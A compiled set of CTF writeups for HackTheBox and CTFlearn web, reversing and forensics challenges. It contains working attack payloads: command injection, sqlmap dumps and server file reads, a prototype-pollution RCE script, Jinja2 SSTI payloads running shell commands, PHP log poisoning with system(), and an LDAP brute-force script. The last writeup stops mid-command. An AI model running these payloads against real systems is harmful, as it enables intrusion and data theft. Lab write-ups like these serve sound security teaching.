<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-cabdi13
description: CTF writeups and security challenges by cabdi13.
---

# Writeups by cabdi13

Source repository: `/repos/cabdi13`

## Repository Index

- CTF-writeups/README.md
- CTF-writeups/HackTheBox/machines/Previse/README.md
- CTF-writeups/HackTheBox/challenges/web/Emdee-five-for-life/README.md
- CTF-writeups/HackTheBox/challenges/web/FreeLancer/README.md
- CTF-writeups/HackTheBox/challenges/web/Gunship/README.md
- CTF-writeups/HackTheBox/challenges/web/Phonebook/README.md
- CTF-writeups/HackTheBox/challenges/web/Templated/README.md
- CTF-writeups/HackTheBox/challenges/web/Toxic/README.md
- CTF-writeups/HackTheBox/challenges/web/baby-ninja-jinja/README.md
- CTF-writeups/HackTheBox/challenges/reversing/Impossible-Password/README.md
- CTF-writeups/HackTheBox/challenges/forensics/Illumination/README.md
- CTF-writeups/CTFlearn/web/Calculat3-M3/README.md
- CTF-writeups/CTFlearn/web/Inj3ction-Time/README.md

## Writeup Content


### File: CTF-writeups/CTFlearn/web/Calculat3-M3/README.md

# Calculat3 M3

A simple command injection challenge will be demonstrated in this walkthrough

Here is the challenge page we got after visiting the given link.

I provided random input in this calculator and intercepted the request with BurpSuite

I got one parameter `expression` taking the values 
```
expression: 8 5 * 6 6 
```
`;ls` was used to try to inject commands

After forwarding the request above, it has finally been flagged

```
ctf{*****_***_***_***_*********}
```


### File: CTF-writeups/CTFlearn/web/Inj3ction-Time/README.md

# Inj3ction Time 
From the description you’ll notice that there’s SQLi and you’ll use UNION query, the injection here is UNION based. Nice !

You’ll find that there’s input field ID and you should enter numbers and then you’ll see information about the users, if you try to insert words you won’t get anything

> You can use sqlmap

We must first extract the names of the existing databases :
```
python sqlmap.py -u https://web.ctflearn.com/web8/?id= -p id --dbs

available databases [2]:
[*] information_schema
[*] webeight
```
The next step is to extract the `webeight` database information
```
python sqlmap.py -u https://web.ctflearn.com/web8/?id= -p id -D webeight --dump

Database: webeight
Table: w0w_y0u_f0und_m3
[1 entry]
+---------------------------------+
| f0und_m3                        |
+---------------------------------+
| abctf{*-*-*-*-*-*-*-*-*-*-*-*-} |
+---------------------------------+
```


### File: CTF-writeups/HackTheBox/challenges/forensics/Illumination/README.md

# Illumination

This forensics challenge is by hack the box and exploits leaving security breaches in git logs.

For this challenge you should download the given file and input the password when asked for.

This is what you see when opening for the first time

```
|--Illumination.JS
   |-------.git
   |-------config.json
   |-------bot.js
```

I then opened config.json in order to learn more about the program I was looking at. 

One of the folders there is named .git, which indicates that this is most likely a git repository.

`config.json : `
```json
{
	"token": "Replace me with token when in use! Security Risk!",
	"prefix": "~",
	"lightNum": "1337",
	"username": "UmVkIEhlcnJpbmcsIHJlYWQgdGhlIEpTIGNhcmVmdWxseQ==",
	"host": "127.0.0.1"
}
```
The top line is interesting. The token has been replaced due to a security risk. A developer may have left this in the git logs.

In the `Illumination.JS` folder, open the terminal and enter the `git log` command

```bash
commit edc5aabf933f6bb161ceca6cf7d0d2160ce333ec (HEAD -> master)
Author: SherlockSec <dan@lights.htb>
Date:   Fri May 31 14:16:43 2019 +0100

    Added some whitespace for readability!

commit 47241a47f62ada864ec74bd6dedc4d33f4374699
Author: SherlockSec <dan@lights.htb>
Date:   Fri May 31 12:00:54 2019 +0100

    Thanks to contributors, I removed the unique token as it was a security risk. Thanks for reporting responsibly!

commit ddc606f8fa05c363ea4de20f31834e97dd527381
Author: SherlockSec <dan@lights.htb>
Date:   Fri May 31 09:14:04 2019 +0100

    Added some more comments for the lovely contributors! Thanks for helping out!

commit 335d6cfe3cdc25b89cae81c50ffb957b86bf5a4a
Author: SherlockSec <dan@lights.htb>
Date:   Thu May 30 22:16:02 2019 +0100

    Moving to Git, first time using it. First Commit!
```
> Use the `git log -p` command for more details.

The second one down looks interesting:
```bash
commit 47241a47f62ada864ec74bd6dedc4d33f4374699
Author: SherlockSec <dan@lights.htb>
Date:   Fri May 31 12:00:54 2019 +0100

    Thanks to contributors, I removed the unique token as it was a security risk. Thanks for reporting responsibly!
```
You can use the following command to see the details of each commit
```bash
git show 47241a47f62ada864ec74bd6dedc4d33f4374699

commit 47241a47f62ada864ec74bd6dedc4d33f4374699
Author: SherlockSec <dan@lights.htb>
Date:   Fri May 31 12:00:54 2019 +0100

    Thanks to contributors, I removed the unique token as it was a security risk. Thanks for reporting responsibly!

diff --git a/config.json b/config.json
index 316dc21..6735aa6 100644
--- a/config.json
+++ b/config.json
@@ -1,6 +1,6 @@
 {

-       "token": "SFRCe3YzcnNpMG5fYzBudHIwbF9hbV9JX3JpZ2h0P30=",
+       "token": "Replace me with token when in use! Security Risk!",
        "prefix": "~",
        "lightNum": "1337",
        "username": "UmVkIEhlcnJpbmcsIHJlYWQgdGhlIEpTIGNhcmVmdWxseQ==",

```

It is enough to decode the `token` value to `base 64`


### File: CTF-writeups/HackTheBox/challenges/reversing/Impossible-Password/README.md

# Impossible Password

Once extracted, we have the `impossible_password.bin` file. Let's see what type it is.
```
file impossible_password.bin
impossible_password.bin: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=ba116ba1912a8c3779ddeb579404e2fdf34b1568, stripped
```

It’s an `ELF 64-bit LSB` executable.

Strings inside the `.data` section
```
rabin2 -z impossible_password.bin
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000a70 0x00400a70 14  15   .rodata ascii SuperSeKretKey
1   0x00000a82 0x00400a82 4   5    .rodata ascii %20s
2   0x00000a87 0x00400a87 5   6    .rodata ascii [%s]\n
```

`SuperSeKretKey` appears to be interesting

# Execution
```
chmod +x impossible_password.bin
./impossible_password.bin
* SuperSeKretKey
[SuperSeKretKey]
** WhatShouldIWrite?
```

By executing this program, a star `(*)` is displayed. I want to write `SuperSeKretKey` because the string displayed in the `.data` section informs us that the string (`%s`) is manipulated. Indeed, when I put SuperSeKretKey, this text is surrounded with `[]`.

After this, two stars `(**)` are displayed. I’ve tried to write many things (as WhatShouldIWrite?), but the program always terminates

It looks like the program is waiting for a specific string, but I don’t know what it is.

# Reverse engineering
<i>Let's use Radare2</i>

Perform analysis :
```
radare2 impossible_password.bin
[0x004006a0]> aaaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[x] Finding function preludes
[x] Enable constraint types analysis for variables
```
Change memory address to main function :
```
[0x004006a0]> s main
[0x0040085d]>
```
The focus is now at the `main()` address: `0x0040085d`.

# Disassemble

With the `pdf` command, disassemble the `main()` code 

> pdf => `print disassemble function`

```
[0x0040085d]> pdf
            ; DATA XREF from entry0 @ 0x4006bd
┌ 283: int main (int argc, char **argv);
│           ; var int64_t var_50h @ rbp-0x50
│           ; var int64_t var_44h @ rbp-0x44
│           ; var int64_t var_40h @ rbp-0x40
│           ; var int64_t var_3fh @ rbp-0x3f
│           ; var int64_t var_3eh @ rbp-0x3e
│           ; var int64_t var_3dh @ rbp-0x3d
│           ; var int64_t var_3ch @ rbp-0x3c
│           ; var int64_t var_3bh @ rbp-0x3b
│           ; var int64_t var_3ah @ rbp-0x3a
│           ; var int64_t var_39h @ rbp-0x39
│           ; var int64_t var_38h @ rbp-0x38
│           ; var int64_t var_37h @ rbp-0x37
│           ; var int64_t var_36h @ rbp-0x36
│           ; var int64_t var_35h @ rbp-0x35
│           ; var int64_t var_34h @ rbp-0x34
│           ; var int64_t var_33h @ rbp-0x33
│           ; var int64_t var_32h @ rbp-0x32
│           ; var int64_t var_31h @ rbp-0x31
│           ; var int64_t var_30h @ rbp-0x30
│           ; var int64_t var_2fh @ rbp-0x2f
│           ; var int64_t var_2eh @ rbp-0x2e
│           ; var int64_t var_2dh @ rbp-0x2d
│           ; var int64_t var_20h @ rbp-0x20
│           ; var int64_t var_ch @ rbp-0xc
│           ; var int64_t var_8h @ rbp-0x8
│           ; arg int argc @ rdi
│           ; arg char **argv @ rsi
│           0x0040085d      55             push rbp
│           0x0040085e      4889e5         mov rbp, rsp
│           0x00400861      4883ec50       sub rsp, 0x50
│           0x00400865      897dbc         mov dword [var_44h], edi    ; argc
│           0x00400868      488975b0       mov qword [var_50h], rsi    ; argv
│           0x0040086c      48c745f8700a.  mov qword [var_8h], str.SuperSeKretKey ; 0x400a70 ; "SuperSeKretKey"
│           0x00400874      c645c041       mov byte [var_40h], 0x41    ; 'A' ; 65
│           0x00400878      c645c15d       mov byte [var_3fh], 0x5d    ; ']' ; 93
│           0x0040087c      c645c24b       mov byte [var_3eh], 0x4b    ; 'K' ; 75
│           0x00400880      c645c372       mov byte [var_3dh], 0x72    ; 'r' ; 114
│           0x00400884      c645c43d       mov byte [var_3ch], 0x3d    ; '=' ; 61
│           0x00400888      c645c539       mov byte [var_3bh], 0x39    ; '9' ; 57
│           0x0040088c      c645c66b       mov byte [var_3ah], 0x6b    ; 'k' ; 107
│           0x00400890      c645c730       mov byte [var_39h], 0x30    ; '0' ; 48
│           0x00400894      c645c83d       mov byte [var_38h], 0x3d    ; '=' ; 61
│           0x00400898      c645c930       mov byte [var_37h], 0x30    ; '0' ; 48
│           0x0040089c      c645ca6f       mov byte [var_36h], 0x6f    ; 'o' ; 111
│           0x004008a0      c645cb30       mov byte [var_35h], 0x30    ; '0' ; 48
│           0x004008a4      c645cc3b       mov byte [var_34h], 0x3b    ; ';' ; 59
│           0x004008a8      c645cd6b       mov byte [var_33h], 0x6b    ; 'k' ; 107
│           0x004008ac      c645ce31       mov byte [var_32h], 0x31    ; '1' ; 49
│           0x004008b0      c645cf3f       mov byte [var_31h], 0x3f    ; '?' ; 63
│           0x004008b4      c645d06b       mov byte [var_30h], 0x6b    ; 'k' ; 107
│           0x004008b8      c645d138       mov byte [var_2fh], 0x38    ; '8' ; 56
│           0x004008bc      c645d231       mov byte [var_2eh], 0x31    ; '1' ; 49
│           0x004008c0      c645d374       mov byte [var_2dh], 0x74    ; 't' ; 116
│           0x004008c4      bf7f0a4000     mov edi, 0x400a7f           ; const char *format
│           0x004008c9      b800000000     mov eax, 0
│           0x004008ce      e82dfdffff     call sym.imp.printf         ; int printf(const char *format)
│           0x004008d3      488d45e0       lea rax, [var_20h]
│           0x004008d7      4889c6         mov rsi, rax
│           0x004008da      bf820a4000     mov edi, str.20s            ; 0x400a82 ; "%20s" ; const char *format
│           0x004008df      b800000000     mov eax, 0
│           0x004008e4      e887fdffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x004008e9      488d45e0       lea rax, [var_20h]
│           0x004008ed      4889c6         mov rsi, rax
│           0x004008f0      bf870a4000     mov edi, str.s              ; 0x400a87 ; "[%s]\n" ; const char *format
│           0x004008f5      b800000000     mov eax, 0
│           0x004008fa      e801fdffff     call sym.imp.printf         ; int printf(const char *format)
│           0x004008ff      488b55f8       mov rdx, qword [var_8h]
│           0x00400903      488d45e0       lea rax, [var_20h]
│           0x00400907      4889d6         mov rsi, rdx                ; const char *s2
│           0x0040090a      4889c7         mov rdi, rax                ; const char *s1
│           0x0040090d      e81efdffff     call sym.imp.strcmp         ; int strcmp(const char *s1, const char *s2)
│           0x00400912      8945f4         mov dword [var_ch], eax
│           0x00400915      837df400       cmp dword [var_ch], 0
│       ┌─< 0x00400919      740a           je 0x400925
│       │   0x0040091b      bf01000000     mov edi, 1                  ; int status
│       │   0x00400920      e85bfdffff     call sym.imp.exit           ; void exit(int status)
│       │   ; CODE XREF from main @ 0x400919
│       └─> 0x00400925      bf8d0a4000     mov edi, 0x400a8d           ; const char *format
│           0x0040092a      b800000000     mov eax, 0
│           0x0040092f      e8ccfcffff     call sym.imp.printf         ; int printf(const char *format)
│           0x00400934      488d45e0       lea rax, [var_20h]
│           0x00400938      4889c6         mov rsi, rax
│           0x0040093b      bf820a4000     mov edi, str.20s            ; 0x400a82 ; "%20s" ; const char *format
│           0x00400940      b800000000     mov eax, 0
│           0x00400945      e826fdffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x0040094a      bf14000000     mov edi, 0x14               ; 20 ; size_t arg1
│           0x0040094f      e839feffff     call fcn.0040078d
│           0x00400954      4889c2         mov rdx, rax
│           0x00400957      488d45e0       lea rax, [var_20h]
│           0x0040095b      4889d6         mov rsi, rdx                ; const char *s2
│           0x0040095e      4889c7         mov rdi, rax                ; const char *s1
│           0x00400961      e8cafcffff     call sym.imp.strcmp         ; int strcmp(const char *s1, const char *s2)
│           0x00400966      85c0           test eax, eax
│       ┌─< 0x00400968      750c           jne 0x400976
│       │   0x0040096a      488d45c0       lea rax, [var_40h]
│       │   0x0040096e      4889c7         mov rdi, rax                ; int64_t arg1
│       │   0x00400971      e802000000     call fcn.00400978
│       │   ; CODE XREF from main @ 0x400968
│       └─> 0x00400976      c9             leave
└           0x00400977      c3             ret
```

From `0x0040086c` to `0x00400920` memory addresses, some manipulations are carried out on strings and to be honest, I didn’t try to understand because something popped into my head.

At `0x00400961` memory address, the binary safe string comparison strcmp is performed between `*s1` and `*`s2`.

Let’s talk about the `0x00400968` memory address.

Register `eax` will contain the return code from `strcmp`, after the call. The test `eax`, `eax` is the same as `and` `eax`, `eax` (bitwise and) except that it doesn’t store the result in `eax`. So `eax` isn’t affected by the test, but the `zero-flag (ZF)` is.

The test `eax`, `eax` is necessary to make the jne work in the first place. Also, jne is the same as `jnz`, just as `je` is the same as `jz`. Both act based on the `ZF` value.

The `jne` branch will be taken if `ZF=0` and therefore whenever `strcmp` returns a non-zero value (strings not equal). Conversely if `eax` contains zero upon return from `strcmp`, the jump via `jne` will not happen.

If you have understood everything correctly, `strcmp` compares the strings and sets `eax` to zero if the strings are `equal`. If they are not, the `jne` instruction takes us to the memory address `0x00400976` which is the program’s exit (leave).

# Reopen in read-write
```
[0x0040085d]> oo+
```
Change memory address focus

We want to edit the `jne` section, so let’s jump into this memory address.
```
Change memory address focus
We want to edit the jne section, so let’s jump into this memory address.
```
ASM instruction modification

The easy way to bypass this `jne` is to write `NOP` (`No OPeration`) instruction.
```
[0x00400968]> wx 9090
[0x00400968]> wa nop
Written 1 byte(s) (nop) = wx 90
```
We can see our new instruction by disassembling a new time (the disassemble has been truncated).
```
[0x00400968]> pdf
0x00400961      e8cafcffff     call sym.imp.strcmp         ; int strcmp(const char *s1, const char *s2)
0x00400966      85c0           test eax, eax
0x00400968      90             nop
```
That’s all with `radare2`, we can leave.
```
[0x00400968]> q
```
Execution
```
./impossible_password.bin
* SuperSeKretKey
[SuperSeKretKey]
** plop
HTB{+*+*+*+*+*+*+*+*+*+*+*+*}
```
Affected by: [Adrien](https://illuad.fr/2020/07/16/writeup-htb-reversing-impossible-password.html)


### File: CTF-writeups/HackTheBox/challenges/web/Emdee-five-for-life/README.md

# Emdee five for life writeup
<b>Starting point</b>

our only task is to submit the string after converting it to md5 hash 

but when i tried to submit i got this
> Yup Too slow

We'll automate this by writing a Python script

# page source
```html
<html>
<head>
<title>emdee five for life</title>
</head>
<body style="background-color:powderblue;">
<h1 align='center'>MD5 encrypt this string</h1><h3 align='center'>B6KsLl2q3nMwLszk3DVJ</h3><center><form action="" method="post">
<input type="text" name="hash" placeholder="MD5" align='center'></input>
</br>
<input type="submit" value="Submit"></input>
</form></center>
</body>
</html>
```

# Building the script
So with my crappy skills of regex let’s start building the logic

`><h3 align='center'>sR1LvFdED1Toos1uBn6k</h3>`

This was achieved by using this

`center'>+.*?</h3>`

# script
```python
import requests
import hashlib
import sys
import re


def main(url):
    request = requests.session()
    body = request.get(url).text
    text = re.search("<h3 align='center'>+.*?</h3>",body)
    text = re.search(">+.*?<",text[0])
    hash = hashlib.md5(text[0][1:-1].encode()).hexdigest()
    response = request.post(url = url, data = {"hash":hash})
    flag = re.search("HTB{+.*?}",response.text)[0]
    print(flag)

if __name__=="__main__":
    if len(sys.argv) > 1:
        main(sys.argv[1])
    else:
        print("Please enter the challenge URL")

```
# Getting the flag
```
D:\hackthebox\web>python script.py http://46.101.20.243:30585/
HTB{*-*-*-*-*-*-*-*-*-*}
```




### File: CTF-writeups/HackTheBox/challenges/web/FreeLancer/README.md

# FreeLancer
If you look at the page code, you will come across such commented codes :
```html
<!-- <a href="portfolio.php?id=1">Portfolio 1</a> -->
```
>`[Address]` means challenge address because this address may be different for each participant. We used this symbol to indicate the challenge address.

like a lot of comments with pages to look at and that the portfolio is using the URL parameters. These all might be exploit points.

If we look at the page `[Address]/portfolio.php?id=1?` we can see that it is just that image that was shown on the home page, a label, and some filler text.

<p align="center">
<img src="./image/img1.png">
<br>
If I visit other ID numbers the first 3 are all the same and the fourth and up are just images with no text.
</p>

If again and try a few different inputs I find that anything other than a ";" returns just the image with no text but if I used the ";" then I get the text back. Now I want to try something a little more so I am going to move on to SQLMap to make this quicker.


For SQLmap I am going to run `python sqlmap.py -u [Address]/portfolio.php?id=1 --tables` which gave me 4 databases: `performance_schema`, `mysql`, `information_schema`, and `freelancer`. Freelance looks like the one we want and it has two tables in it: `portfolio` and `safeadmin`.

Now that I know the tables I am going to change my query with SQLmap to `python sqlmap.py -u [Address]/portfolio.php?id=1 -T safeadmin --dump` to specify that I know the Table and I want to dump its contents. 

> `It seemed that we would not get results with this method`

Running ZAP did produce a file of `/administrat` that was not linked on the site and when I went there it was an admin login page.

<p align="center">
<img src="./image/img2.png">
</p>

I found two PHP files named `logout.php` and `panel.php` but the server does not allow us to access them.
To be able to download these files and view their source code, we can use sqlmap.

Usually the pages are stored in the `/var/www/html` path. You can use this method to download the files :
```
python sqlmap.py -u [Address]/portfolio.php?id=1 --file-read=/var/www/html/administrat/panel.php
```
After downloading the file, if you go to path `/.sqlmap/output/[Address]` in your system
You will see the downloaded file here and if you look at the code of this file you will see that there is a flag.


### File: CTF-writeups/HackTheBox/challenges/web/Gunship/README.md

# Gunship
This is a beautiful and simple node web application that contains only one user input And vulnerability 
may be at this point.

<p align="center">
<img src="./images/Screenshot.png">
</p>

Inspection of the source code reveals a comment that hints towards the exploit being caused by prototype pollution in unflatten.

> unflatten seems outdated and a bit vulnerable to prototype pollution we sure hope so that po6ix doesn't pwn our puny app with his AST injection on template engines

```js
const path              = require('path');
const express           = require('express');
const handlebars        = require('handlebars');
const { unflatten }     = require('flat');
const router            = express.Router();

router.get('/', (req, res) => {
    return res.sendFile(path.resolve('views/index.html'));
});

router.post('/api/submit', (req, res) => {
	// unflatten seems outdated and a bit vulnerable to prototype pollution
	// we sure hope so that po6ix doesn't pwn our puny app with his AST injection on template engines

    const { artist } = unflatten(req.body);

	if (artist.name.includes('Haigh') || artist.name.includes('Westaway') || artist.name.includes('Gingell')) {
		return res.json({
			'response': handlebars.compile('Hello {{ user }}, thank you for letting us know!')({ user:'guest' })
		});
	} else {
		return res.json({
			'response': 'Please provide us with the full name of an existing member.'
		});
	}
});

module.exports = router;
```
Some google-fu leads us pretty quickly to the following site with a POC by posix on a protype pollution in AST : [AST Injection, Prototype Pollution to RCE](https://blog.p6.is/AST-Injection/#Exploit)

The proof of concept from the site above only required minor changes in order to get command execution. Note that bash is not available inside the docker container, we could use sh instead but as we only need to grab the flag we can just use simple commands.


```python
import requests

URL = '[URL]'

# make pollution
r = requests.post(URL+'/api/submit', json = {
    "artist.name":"Gingell",
    "__proto__.type": "Program",
    "__proto__.body": [{
        "type": "MustacheStatement",
        "path": 0,
        "params": [{
            "type": "NumberLiteral",
            "value": "process.mainModule.require('child_process').execSync(`whoami > /app/static/out`)"
        }],
        "loc": {
            "start": 0,
            "end": 0
        }
    }]
    })
print(requests.get(URL+'/static/out').text)
```

The command execution is blind, however as we know that the path to the static folder is `/app/static` we can write files into this path and then request them to see the output.

A quick `ls > /app/static/out` and browsing to `/static/out` shows that there is a flag in the current folder.

Changing the command to `cat flag* > /app/static/out` and browsing to `/static/out` again gives us the flag : `HTB{wh3n_l1f3_******_***_**_*****_*********_****_*****}`



### File: CTF-writeups/HackTheBox/challenges/web/Phonebook/README.md

# Phonebook

When we see the login form on the website, it might be command injection, `SQL injection`, `LDAP injection`. 

We can see that this need us to login with workstation username, it might be `LDAP injection`.
<p align="center">
<img src="./images/login.png">
</p>
This is an example of `LDAP injection` payload. We can check for vulnerabilities.

```
user=*)(&
password=*)(&
--> (&(user=*)(&)(password=*)(&)) 

```
<p align="center">
<img src="./images/inject.png">
</p>
Our response showed successful, and a search box appeared when we clicked the button.

Then we type a character in the search box, and it returns some user phonebook information. I tried `flag`, `HTB`, it doesn't find any results.
> If you search for `space`, you will see such information
```
Kyle Reese	reese@skynet.com	555-1234567
Ellery Hun	ehun1z@reddit.com	317-959-9562
Madelaine Lush	mlush5@deliciousdays.com	636-918-1006
Currey Conti	cconti0@auda.org.au	529-673-3935
Chaim Smoth	csmothf@sbwire.com	895-974-4117
Eldin Jelf	ejelf1u@google.pl	363-426-3563
Ganny Marti	gmartih@diigo.com	796-793-6925
Jobey Olley	jolleyx@abc.net.au	607-345-0290
Katalin Wilde	kwildep@plala.or.jp	414-839-2681
Stinky Trood	stroodz@foxnews.com	933-416-1003
Tab Zoren	tzorenq@mit.edu	360-678-3613
Ursula Beer	ubeer2f@live.com	794-396-6882
Bryan Arman	barman1x@exblog.jp	640-255-8092
Babette Cunio	bcunio2h@macromedia.com	709-363-0223
Berget Novis	bnovis1j@constantcontact.com	780-278-2572
Ced Engley	cengleyi@springer.com	230-780-1999
Caryn Germon	cgermon4@wiley.com	967-789-6335
Devina Alcide	dalcideu@arizona.edu	828-947-3484
Dionne Lammas	dlammask@washingtonpost.com	824-561-5676
Emmalynn Burnup	eburnupd@networkadvertising.org	148-856-7052
Fredericka Hanks	fhanks1s@census.gov	762-337-5667
Hannah Inder	hinder2a@canalblog.com	315-711-6454
Jay Sharma	jsharmay@t.co	893-382-5236
Lilyan Crepel	lcrepel6@ucoz.com	851-980-1038
...
```
Then we try to find user `Reese`, but the information doesn't look like flag.

output : `Kyle Reese	reese@skynet.com	555-1234567`

Then we change our `payload` to check if the password is the flag.

```
user=Reese
password=HTB*)(&
--> (&(user=Reese)(password=HTB*)(& 
```
This indicates that the payload logs into the web successfully with the payload!

> `The password is the flag!`

## Brute force

We need to get the flag through `brute force`. To do this, write a `Python script`.

```python
import requests
import string

URL = "~"

asciiLower = list(string.ascii_lowercase)

asciiUppercase = list(string.ascii_uppercase)

passwordList = asciiLower + asciiUppercase + [str(i) for i in range(10)] + ["_", "}"]

payload = "HTB{"
password = ""

while True:
    for ch in passwordList:
        password = payload + ch + "*)(&"

        data = {"username": "Reese", "password": password}
        re = requests.post(URL, data=data)

        if "success" in re.text:
            payload += ch
            print(payload)

```
The flag is like this 👌👉  `HTB{d1rectory_******_**_****}`


### File: CTF-writeups/HackTheBox/challenges/web/Templated/README.md

# Templated

> Upon accessing the web instance, we will see this interface

```
Site still under construction
Proudly powered by Flask/Jinja2
```
The message already informs us that the page is built using Flask / Jinja2.

To test this further, I will introduce routes in the url.

I got a `404` error but notice what we entered as path in URL is getting rendered in the website. Here are a few `XSS` payloads.

```
<script>alert("hello")</script>
```
If you try this pyload, you will not get any results.

But the following pyload is executed :

```
<img src=! onerror="alert('hello')">
```

# Server Side Template Injection (SSTI)

As a result, we know that the web is vulnerable to `XSS` payloads, but this did not lead us to the flag.

Assuming that the challenge is titled `Templated` and that `Jinja2` is a web template engine for Python.

There might be a vulnerability related to `SSTI` (`Server Side Template Injection`).

Payload : `{{46+46}}`

Output  : it give `92` as output

Currently 2 vulnerabilities have been found, `SSTI` and `XSS` (`Reflected`)

Here is an article regarding SSTI problems with [Flask and Jinja](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti)

By using `__mro__ ` or `mro()` in Python, we can go back up the tree of inherited objects.

We can use the `MRO` function to display classes with the following payload

```
{{"".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]("os").popen("ls *").read()}}
```

The list shows all the files, and guess what we can see is `flag.txt`. Now we just need to replace `ls *` with `cat flag.txt`.

```
{{"".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]("os").popen("cat flag.txt").read()}}
```

We have finally obtained the flag. (^!^)



### File: CTF-writeups/HackTheBox/challenges/web/Toxic/README.md

# Toxic
The following is a quick  writeup for the Toxic challenge.

By inspecting the challenge's files, specifically index.php and PageModel.php, we see that our phpsessid cookie is deserialised, and the file to display on the screen is retrieved from the deserialised object.

The cookie is converted to ascii and the object is produced
```
echo 'Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9' | base64 -d
O:9:"PageModel":1:{s:4:"file";s:15:"/www/index.html";}
```
While we are able to read and modify files from the server, we cannot access the flag file since we don't know its name. Therefore, we poison the server logs.

```
echo 'O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";}' | base64
Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNz
LmxvZyI7fQo=
```
This new cookie will be sent to the server, and the log file can be read.
```
GET / HTTP/1.1
Host: 127.0.0.1:1234
User-Agent: <?php system('ls /');?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQo=
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```
We send this request to poison the nginx log, and when we display the log file again, we see a directory listing.
```
dev
entrypoint.sh
etc
flag_SDCCSD
home
lib
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```
The cookie reads the flag file, we send it to the server, The flag is ours.
```
echo 'O:9:"PageModel":1:{s:4:"file";s:11:"/flag_SDCCSD";}' | base64

Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxMToiL2ZsYWdfU0RDQ1NEIjt9
```


### File: CTF-writeups/HackTheBox/challenges/web/baby-ninja-jinja/README.md

# baby ninja jinja

A form appears on the website. Since the entry did not appear to be vulnerable to SQL injection or any other attack.

If you see the source code `(crt + u)` of the page, such a thing is commented at the bottom of the page :
```html
</body>
<!-- /debug -->
</html>
```

> If we look at this path

`/debug` :
```python
from flask import Flask, session, render_template, request, Response, render_template_string, g
import functools, sqlite3, os

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(120)

acc_tmpl = '''{% extends 'index.html' %}
{% block content %}
<h3>baby_ninja joined, total number of rebels: reb_num<br>
{% endblock %}
'''

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect('/tmp/ninjas.db')
        db.isolation_level = None
        db.row_factory = sqlite3.Row
        db.text_factory = (lambda s: s.replace('{{', '').
            replace("'", '&#x27;').
            replace('"', '&quot;').
            replace('<', '&lt;').
            replace('>', '&gt;')
        )
    return db

def query_db(query, args=(), one=False):
    with app.app_context():
        cur = get_db().execute(query, args)
        rv = [dict((cur.description[idx][0], str(value)) \
            for idx, value in enumerate(row)) for row in cur.fetchall()]
        return (rv[0] if rv else None) if one else rv

@app.before_first_request
def init_db():
    with app.open_resource('schema.sql', mode='r') as f:
        get_db().cursor().executescript(f.read())

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None: db.close()

def rite_of_passage(func):
    @functools.wraps(func)
    def born2pwn(*args, **kwargs):

        name = request.args.get('name', '')

        if name:
            query_db('INSERT INTO ninjas (name) VALUES ("%s")' % name)

            report = render_template_string(acc_tmpl.
                replace('baby_ninja', query_db('SELECT name FROM ninjas ORDER BY id DESC', one=True)['name']).
                replace('reb_num', query_db('SELECT COUNT(id) FROM ninjas', one=True).itervalues().next())
            )

            if session.get('leader'): 
                return report

            return render_template('welcome.jinja2')
        return func(*args, **kwargs)
    return born2pwn

@app.route('/')
@rite_of_passage
def index():
    return render_template('index.html')

@app.route('/debug')
def debug():
    return Response(open(__file__).read(), mimetype='text/plain')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1337, debug=True)
```

# SSTI

This code shows that the name entry is inserted into a backend database and then extracted again from it to replace the substring `baby_ninja` in the `acc_tmpl` string, which is then passed to the `render_template_string` function.

The string acc_tmpl contains template blocks that are indicated by `{%" and the trailing "%}`. The challenge's name contains the word `Jinja`, which is a template language for Python.

The attack should consist of a `Server-Side Template Injection (SSTI)`. This is accomplished by inserting template blocks into our name parameter so that the template blocks are executed in the context of the backend server when rendering the template string.

* SSTI attacks on Jinja & Python
    * [Jinja2 SSTI](https://hackmd.io/@Chivato/HyWsJ31dI#References)
    * [Jinja2 SSTI](https://realpython.com/primer-on-jinja-templating/)

It was built as follows
```python
{%+if+session.update({request.args.se:request.application.__globals__.__builtins__.__import__(request.args.os).popen(request.args.command).read()})+==+1+%}{%+endif+%}&se=asdf&os=os&command=ls
```
The result of the above command cannot be displayed because it stores the result of the request in a cookie called a `session`
We must decode this cookie every time we send a request
```bash
flask-unsign --decode --cookie "eyJhc2RmIjp7IiBiIjoiWVhCd0xuQjVDbVpzWVdkZlVEVTBaV1FLYzJOb1pXMWhMbk54YkFwemRHRjBhV01LZEdWdGNHeGhkR1Z6Q2c9PSJ9fQ.YRQfrQ.HxMrG2AVH-UYqJ2LUUCVt8lEvDw"

